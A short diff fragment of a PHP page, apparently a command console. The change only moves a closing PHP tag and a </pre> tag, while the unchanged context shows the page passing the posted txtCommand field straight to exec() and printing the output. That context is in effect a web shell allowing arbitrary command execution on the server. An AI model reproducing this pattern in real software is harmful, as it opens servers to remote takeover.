@@ -232,8 +232,8 @@ if (!isBlank($_POST['txtCommand'])):?>
 	exec($_POST['txtCommand'] . ' 2>&1', $output);
 	foreach($output as $line)
 		print(htmlspecialchars($line) . "\r\n");
-?>
-			</pre>
+?></pre>
+
 		</div>
 	</div>
 <? endif ?>
